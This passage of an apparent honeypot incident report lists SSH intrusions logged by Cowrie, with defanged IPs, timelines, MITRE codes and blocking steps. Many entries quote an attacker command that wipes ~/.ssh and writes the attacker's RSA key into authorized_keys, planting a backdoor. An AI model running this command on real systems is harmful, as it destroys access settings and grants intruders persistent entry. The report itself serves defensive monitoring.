| **Last Seen** | 2026-06-02 20:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:54:05` | `cowrie.session.connect` |
| `2026-06-02 20:54:05` | `cowrie.client.version` |
| `2026-06-02 20:54:05` | `cowrie.client.kex` |
| `2026-06-02 20:54:06` | `cowrie.login.success` |
| `2026-06-02 20:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ee4f56f1006

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 20:54 |
| **Last Seen** | 2026-06-02 20:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:54:48` | `cowrie.session.connect` |
| `2026-06-02 20:54:48` | `cowrie.client.version` |
| `2026-06-02 20:54:48` | `cowrie.client.kex` |
| `2026-06-02 20:54:50` | `cowrie.login.success` |
| `2026-06-02 20:54:50` | `cowrie.session.params` |
| `2026-06-02 20:54:50` | `cowrie.command.input` |
| `2026-06-02 20:54:50` | `cowrie.command.failed` |
| `2026-06-02 20:54:51` | `cowrie.log.closed` |
| `2026-06-02 20:54:51` | `cowrie.session.params` |
| `2026-06-02 20:54:51` | `cowrie.command.input` |
| `2026-06-02 20:54:52` | `cowrie.session.file_download` |
| `2026-06-02 20:54:52` | `cowrie.log.closed` |
| `2026-06-02 20:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8819aaf5b7b6

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-06-02 20:54 |
| **Last Seen** | 2026-06-02 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:54:55` | `cowrie.session.connect` |
| `2026-06-02 20:54:55` | `cowrie.client.version` |
| `2026-06-02 20:54:56` | `cowrie.client.kex` |
| `2026-06-02 20:54:57` | `cowrie.login.success` |
| `2026-06-02 20:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e4a8ed87eb

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 20:54 |
| **Last Seen** | 2026-06-02 20:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:54:58` | `cowrie.session.connect` |
| `2026-06-02 20:54:58` | `cowrie.client.version` |
| `2026-06-02 20:54:58` | `cowrie.client.kex` |
| `2026-06-02 20:54:58` | `cowrie.login.success` |
| `2026-06-02 20:54:58` | `cowrie.session.params` |
| `2026-06-02 20:54:58` | `cowrie.command.input` |
| `2026-06-02 20:54:58` | `cowrie.command.failed` |
| `2026-06-02 20:54:59` | `cowrie.log.closed` |
| `2026-06-02 20:54:59` | `cowrie.session.params` |
| `2026-06-02 20:54:59` | `cowrie.command.input` |
| `2026-06-02 20:54:59` | `cowrie.session.file_download` |
| `2026-06-02 20:54:59` | `cowrie.log.closed` |
| `2026-06-02 20:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50634c58563

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 20:55 |
| **Last Seen** | 2026-06-02 20:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:55:01` | `cowrie.session.connect` |
| `2026-06-02 20:55:01` | `cowrie.client.version` |
| `2026-06-02 20:55:01` | `cowrie.client.kex` |
| `2026-06-02 20:55:01` | `cowrie.login.success` |
| `2026-06-02 20:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.208.108[.]166` to AbuseIPDB if not already reported
- [ ] Block `104.208.108[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b23607a9f4d1

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]17` |
| **First Seen** | 2026-06-02 20:55 |
| **Last Seen** | 2026-06-02 20:55 |
| **Session Duration** | 21s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:55:21` | `cowrie.session.connect` |
| `2026-06-02 20:55:21` | `cowrie.client.version` |
| `2026-06-02 20:55:21` | `cowrie.client.kex` |
| `2026-06-02 20:55:23` | `cowrie.client.fingerprint` |
| `2026-06-02 20:55:23` | `cowrie.login.failed` |
| `2026-06-02 20:55:23` | `cowrie.login.success` |
| `2026-06-02 20:55:42` | `cowrie.direct-tcpip.request` |
| `2026-06-02 20:55:42` | `cowrie.direct-tcpip.ja4` |
| `2026-06-02 20:55:42` | `cowrie.direct-tcpip.data` |
| `2026-06-02 20:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]17` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f81e65d9b23

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 20:55 |
| **Last Seen** | 2026-06-02 20:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:55:23` | `cowrie.session.connect` |
| `2026-06-02 20:55:23` | `cowrie.client.version` |
| `2026-06-02 20:55:24` | `cowrie.client.kex` |
| `2026-06-02 20:55:24` | `cowrie.login.success` |
| `2026-06-02 20:55:24` | `cowrie.session.params` |
| `2026-06-02 20:55:24` | `cowrie.command.input` |
| `2026-06-02 20:55:24` | `cowrie.command.failed` |
| `2026-06-02 20:55:25` | `cowrie.log.closed` |
| `2026-06-02 20:55:25` | `cowrie.session.params` |
| `2026-06-02 20:55:25` | `cowrie.command.input` |
| `2026-06-02 20:55:25` | `cowrie.session.file_download` |
| `2026-06-02 20:55:25` | `cowrie.log.closed` |
| `2026-06-02 20:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a7616192efe

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 20:55 |
| **Last Seen** | 2026-06-02 20:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:55:27` | `cowrie.session.connect` |
| `2026-06-02 20:55:27` | `cowrie.client.version` |
| `2026-06-02 20:55:27` | `cowrie.client.kex` |
| `2026-06-02 20:55:28` | `cowrie.login.success` |
| `2026-06-02 20:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af125ac00e13

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:55 |
| **Last Seen** | 2026-06-02 20:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:55:42` | `cowrie.session.connect` |
| `2026-06-02 20:55:42` | `cowrie.client.version` |
| `2026-06-02 20:55:42` | `cowrie.client.kex` |
| `2026-06-02 20:55:42` | `cowrie.login.success` |
| `2026-06-02 20:55:43` | `cowrie.session.params` |
| `2026-06-02 20:55:43` | `cowrie.command.input` |
| `2026-06-02 20:55:43` | `cowrie.command.failed` |
| `2026-06-02 20:55:43` | `cowrie.log.closed` |
| `2026-06-02 20:55:43` | `cowrie.session.params` |
| `2026-06-02 20:55:43` | `cowrie.command.input` |
| `2026-06-02 20:55:43` | `cowrie.session.file_download` |
| `2026-06-02 20:55:43` | `cowrie.log.closed` |
| `2026-06-02 20:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b39b67a661

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:55 |
| **Last Seen** | 2026-06-02 20:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:55:45` | `cowrie.session.connect` |
| `2026-06-02 20:55:45` | `cowrie.client.version` |
| `2026-06-02 20:55:45` | `cowrie.client.kex` |
| `2026-06-02 20:55:46` | `cowrie.login.success` |
| `2026-06-02 20:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31cd1bf959b9

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:56 |
| **Last Seen** | 2026-06-02 20:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:56:55` | `cowrie.session.connect` |
| `2026-06-02 20:56:55` | `cowrie.client.version` |
| `2026-06-02 20:56:55` | `cowrie.client.kex` |
| `2026-06-02 20:56:55` | `cowrie.login.success` |
| `2026-06-02 20:56:56` | `cowrie.session.params` |
| `2026-06-02 20:56:56` | `cowrie.command.input` |
| `2026-06-02 20:56:56` | `cowrie.command.failed` |
| `2026-06-02 20:56:56` | `cowrie.log.closed` |
| `2026-06-02 20:56:56` | `cowrie.session.params` |
| `2026-06-02 20:56:56` | `cowrie.command.input` |
| `2026-06-02 20:56:56` | `cowrie.session.file_download` |
| `2026-06-02 20:56:56` | `cowrie.log.closed` |
| `2026-06-02 20:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb13e84eb9d

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:56 |
| **Last Seen** | 2026-06-02 20:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:56:58` | `cowrie.session.connect` |
| `2026-06-02 20:56:58` | `cowrie.client.version` |
| `2026-06-02 20:56:58` | `cowrie.client.kex` |
| `2026-06-02 20:56:59` | `cowrie.login.success` |
| `2026-06-02 20:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c3bbe3444c7

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:57 |
| **Last Seen** | 2026-06-02 20:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:57:26` | `cowrie.session.connect` |
| `2026-06-02 20:57:26` | `cowrie.client.version` |
| `2026-06-02 20:57:26` | `cowrie.client.kex` |
| `2026-06-02 20:57:27` | `cowrie.login.success` |
| `2026-06-02 20:57:27` | `cowrie.session.params` |
| `2026-06-02 20:57:27` | `cowrie.command.input` |
| `2026-06-02 20:57:27` | `cowrie.command.failed` |
| `2026-06-02 20:57:27` | `cowrie.log.closed` |
| `2026-06-02 20:57:27` | `cowrie.session.params` |
| `2026-06-02 20:57:27` | `cowrie.command.input` |
| `2026-06-02 20:57:28` | `cowrie.session.file_download` |
| `2026-06-02 20:57:28` | `cowrie.log.closed` |
| `2026-06-02 20:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccec18cdc47b

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:57 |
| **Last Seen** | 2026-06-02 20:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:57:30` | `cowrie.session.connect` |
| `2026-06-02 20:57:30` | `cowrie.client.version` |
| `2026-06-02 20:57:30` | `cowrie.client.kex` |
| `2026-06-02 20:57:30` | `cowrie.login.success` |
| `2026-06-02 20:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00dcab9b3da2

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 20:58 |
| **Last Seen** | 2026-06-02 20:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:58:18` | `cowrie.session.connect` |
| `2026-06-02 20:58:18` | `cowrie.client.version` |
| `2026-06-02 20:58:19` | `cowrie.client.kex` |
| `2026-06-02 20:58:20` | `cowrie.login.success` |
| `2026-06-02 20:58:20` | `cowrie.session.params` |
| `2026-06-02 20:58:20` | `cowrie.command.input` |
| `2026-06-02 20:58:20` | `cowrie.command.failed` |
| `2026-06-02 20:58:21` | `cowrie.log.closed` |
| `2026-06-02 20:58:21` | `cowrie.session.params` |
| `2026-06-02 20:58:21` | `cowrie.command.input` |
| `2026-06-02 20:58:21` | `cowrie.session.file_download` |
| `2026-06-02 20:58:21` | `cowrie.log.closed` |
| `2026-06-02 20:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96c8020467c7

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 20:58 |
| **Last Seen** | 2026-06-02 20:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:58:24` | `cowrie.session.connect` |
| `2026-06-02 20:58:24` | `cowrie.client.version` |
| `2026-06-02 20:58:25` | `cowrie.client.kex` |
| `2026-06-02 20:58:26` | `cowrie.login.success` |
| `2026-06-02 20:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e998d9cdcd

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:58 |
| **Last Seen** | 2026-06-02 20:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:58:38` | `cowrie.session.connect` |
| `2026-06-02 20:58:38` | `cowrie.client.version` |
| `2026-06-02 20:58:38` | `cowrie.client.kex` |
| `2026-06-02 20:58:39` | `cowrie.login.success` |
| `2026-06-02 20:58:39` | `cowrie.session.params` |
| `2026-06-02 20:58:39` | `cowrie.command.input` |
| `2026-06-02 20:58:39` | `cowrie.command.failed` |
| `2026-06-02 20:58:39` | `cowrie.log.closed` |
| `2026-06-02 20:58:40` | `cowrie.session.params` |
| `2026-06-02 20:58:40` | `cowrie.command.input` |
| `2026-06-02 20:58:40` | `cowrie.session.file_download` |
| `2026-06-02 20:58:40` | `cowrie.log.closed` |
| `2026-06-02 20:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afb5ce14cad8

| Field | Detail |
|---|---|
| **Source IP** | `161.35.65[.]86` |
| **First Seen** | 2026-06-02 20:58 |
| **Last Seen** | 2026-06-02 20:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
